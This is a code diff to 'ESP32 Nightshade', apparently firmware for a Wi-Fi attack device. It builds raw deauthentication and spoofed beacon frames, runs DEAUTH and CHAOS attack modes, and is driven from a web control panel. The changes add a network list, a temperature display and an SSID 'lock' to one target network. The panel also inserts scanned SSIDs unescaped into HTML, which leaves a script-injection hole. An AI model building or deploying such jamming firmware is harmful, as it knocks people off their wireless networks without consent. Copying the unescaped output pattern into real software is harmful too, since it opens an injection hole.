@@ -12,6 +12,7 @@
 #include "esp_wifi.h"
 #include <ESPAsyncWebServer.h>
 #include <AsyncTCP.h>
+#include "esp32-hal.h"   // for temperatureRead()
 
 #define TFT_CS 5
 #define TFT_RST 17
@@ -71,6 +72,14 @@ TaskHandle_t attackTaskHandle = NULL;
 
 const uint8_t REASON_CODES[6] = {0x01, 0x02, 0x03, 0x04, 0x07, 0x08};
 
+// Forward declarations
+void stopAll();
+void startSniff();
+void startAttack(uint8_t m);
+void drawNetworkList();
+void drawClientList();
+void drawDetails();
+
 // ====================== FRAME BUILDERS ======================
 void buildDeauth(uint8_t* b, const uint8_t* ap, const uint8_t* c, uint8_t r, uint16_t s) {
   b[0] = 0xC0; b[1] = 0x00;
@@ -117,7 +126,9 @@ void buildBeacon(uint8_t* b, const uint8_t* ap, uint16_t s) {
   uint16_t sc = (s & 0xFFF) << 4;
   b[22] = sc & 0xFF; b[23] = (sc >> 8) & 0xFF;
   memset(&b[24], 0, 12); b[36] = 0x64; b[37] = 0; b[38] = 1; b[39] = 0;
-  b[40] = 0; b[41] = 5; memcpy(&b[42], "F307", 5);
+  b[40] = 0; 
+  b[41] = strlen(TARGET_SSID); 
+  memcpy(&b[42], TARGET_SSID, strlen(TARGET_SSID));
 }
 
 // ====================== CLIENT MGMT ======================
@@ -268,36 +279,31 @@ const char index_html[] PROGMEM = R"rawliteral(
   h1 { font-size:1.4rem; margin-bottom:4px; color:var(--accent); }
   .sub { color:var(--muted); font-size:0.85rem; margin-bottom:20px; }
   .card { background:var(--card); border-radius:12px; padding:16px; margin-bottom:14px; }
-  .status { display:flex; justify-content:space-between; margin-bottom:12px; }
+  .status { display:flex; justify-content:space-between; margin-bottom:10px; }
   .badge { padding:4px 10px; border-radius:20px; font-size:0.75rem; font-weight:600; }
   .on { background:#00ff9d22; color:var(--accent); }
   .off { background:#ffffff11; color:var(--muted); }
   .grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
-  button { background:#252830; border:none; color:var(--text); padding:12px; border-radius:8px; font-size:0.9rem; cursor:pointer; transition:0.15s; }
+  button { background:#252830; border:none; color:var(--text); padding:12px; border-radius:8px; font-size:0.9rem; cursor:pointer; }
   button:active { transform:scale(0.97); }
   button.primary { background:var(--accent); color:#000; font-weight:600; }
   button.danger { background:var(--danger); color:#fff; }
-  .clients { font-family:monospace; font-size:0.8rem; line-height:1.6; max-height:180px; overflow-y:auto; }
+  .clients, .networks { font-family:monospace; font-size:0.8rem; line-height:1.7; max-height:200px; overflow-y:auto; }
+  .net-item { padding:6px 0; border-bottom:1px solid #2a2d35; cursor:pointer; }
+  .net-item:hover { color:var(--accent); }
+  .error { color:var(--danger); font-size:0.85rem; margin-top:8px; display:none; }
   .info { font-size:0.85rem; color:var(--muted); margin-top:8px; }
 </style>
 </head>
 <body>
   <h1>ESP32 Nightshade</h1>
-  <div class="sub">Control Panel • Locked to F307</div>
+  <div class="sub">Control Panel • Locked to <span id="targetName">F307</span></div>
 
   <div class="card">
-    <div class="status">
-      <span>Status</span>
-      <span id="statusBadge" class="badge off">IDLE</span>
-    </div>
-    <div class="status">
-      <span>Clients</span>
-      <span id="clientCount">0</span>
-    </div>
-    <div class="status">
-      <span>Packets</span>
-      <span id="packetCount">0</span>
-    </div>
+    <div class="status"><span>Status</span><span id="statusBadge" class="badge off">IDLE</span></div>
+    <div class="status"><span>Clients</span><span id="clientCount">0</span></div>
+    <div class="status"><span>Packets</span><span id="packetCount">0</span></div>
+    <div class="status"><span>Temperature</span><span id="temp">-- °C</span></div>
   </div>
 
   <div class="card">
@@ -312,11 +318,15 @@ const char index_html[] PROGMEM = R"rawliteral(
   </div>
 
   <div class="card">
+    <div style="margin-bottom:8px;font-weight:600">Wi-Fi Networks</div>
+    <div id="networkList" class="networks">Loading...</div>
+    <div id="lockError" class="error">This tool is locked to the target SSID only.</div>
+  </div>
+
+  <div class="card">
     <div style="margin-bottom:8px;font-weight:600">Connected Clients</div>
     <div id="clientList" class="clients">No clients yet</div>
   </div>
-
-  <div class="info">Connect to this SoftAP → open any page → control the device.</div>
 
 <script>
 async function cmd(action) {
@@ -324,12 +334,28 @@ async function cmd(action) {
   update();
 }
 
+async function selectNet(ssid) {
+  const r = await fetch('/select?ssid=' + encodeURIComponent(ssid));
+  const t = await r.text();
+  const err = document.getElementById('lockError');
+  if (t === "LOCKED") {
+    err.style.display = 'block';
+  } else {
+    err.style.display = 'none';
+    update();
+  }
+}
+
 async function update() {
   try {
     const r = await fetch('/status');
     const d = await r.json();
+
     document.getElementById('clientCount').innerText = d.clients;
     document.getElementById('packetCount').innerText = d.packets;
+    document.getElementById('temp').innerText = d.temp + ' °C';
+    document.getElementById('targetName').innerText = d.target;
+
     const badge = document.getElementById('statusBadge');
     if (d.attacking) {
       badge.innerText = d.mode;
@@ -341,14 +367,27 @@ async function update() {
       badge.innerText = 'IDLE';
       badge.className = 'badge off';
     }
+
+    // Networks
+    const netList = document.getElementById('networkList');
+    if (d.networks && d.networks.length) {
+      netList.innerHTML = d.networks.map(n => 
+        `<div class="net-item" onclick="selectNet('${n}')">${n}</div>`
+      ).join('');
+    } else {
+      netList.innerText = 'No networks found';
+    }
+
+    // Clients
     const list = document.getElementById('clientList');
     if (d.macs && d.macs.length) {
-      list.innerHTML = d.macs.map(m => m).join('<br>');
+      list.innerHTML = d.macs.join('<br>');
     } else {
       list.innerText = 'No clients yet';
     }
   } catch(e) {}
 }
+
 setInterval(update, 1500);
 update();
 </script>
@@ -358,16 +397,20 @@ update();
 
 // ====================== WEB HANDLERS ======================
 void setupWebServer() {
+  // Main page
   server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
-    request->send_P(200, "text/html", index_html);
+    request->send(200, "text/html", index_html);
   });
 
+  // Status endpoint (with temperature + networks list)
   server.on("/status", HTTP_GET, [](AsyncWebServerRequest *request) {
     String json = "{";
     json += "\"sniffing\":" + String(sniffing ? "true" : "false") + ",";
     json += "\"attacking\":" + String(attacking ? "true" : "false") + ",";
     json += "\"clients\":" + String(numClients) + ",";
     json += "\"packets\":" + String(packetCount) + ",";
+    json += "\"temp\":" + String(temperatureRead(), 1) + ",";
+    json += "\"target\":\"" + String(TARGET_SSID) + "\",";
 
     String mode = "IDLE";
     if (attackMode == 1) mode = "DEAUTH";
@@ -376,6 +419,15 @@ void setupWebServer() {
     else if (attackMode == 4) mode = "CHAOS";
     json += "\"mode\":\"" + mode + "\",";
 
+    // Networks list
+    json += "\"networks\":[";
+    for (int i = 0; i < numNetworks; i++) {
+      if (i > 0) json += ",";
+      json += "\"" + networks[i].ssid + "\"";
+    }
+    json += "],";
+
+    // Clients
     json += "\"macs\":[";
     portENTER_CRITICAL(&clientMux);
     for (int i = 0; i < numClients; i++) {
@@ -392,16 +444,43 @@ void setupWebServer() {
     request->send(200, "application/json", json);
   });
 
+  // Select network endpoint
+  server.on("/select", HTTP_GET, [](AsyncWebServerRequest *request) {
+    if (!request->hasParam("ssid")) {
+      request->send(400, "text/plain", "Missing ssid");
+      return;
+    }
+
+    String ssid = request->getParam("ssid")->value();
+
+    if (ssid != TARGET_SSID) {
+      request->send(200, "text/plain", "LOCKED");
+      return;
+    }
+
+    // Find and select F307
+    for (int i = 0; i < numNetworks; i++) {
+      if (networks[i].ssid == TARGET_SSID) {
+        selectedIndex = i;
+        request->send(200, "text/plain", "OK");
+        return;
+      }
+    }
+
+    request->send(200, "text/plain", "LOCKED");
+  });
+
+  // Command endpoint
   server.on("/cmd", HTTP_GET, [](AsyncWebServerRequest *request) {
     if (!request->hasParam("action")) {
       request->send(400, "text/plain", "Missing action");
       return;
     }
+
     String action = request->getParam("action")->value();
 
-    // Safety: only allow if F307 is selected
+    // Safety lock
     if (numNetworks == 0 || networks[selectedIndex].ssid != TARGET_SSID) {
-      // Try to find F307 automatically
       bool found = false;
       for (int i = 0; i < numNetworks; i++) {
         if (networks[i].ssid == TARGET_SSID) {
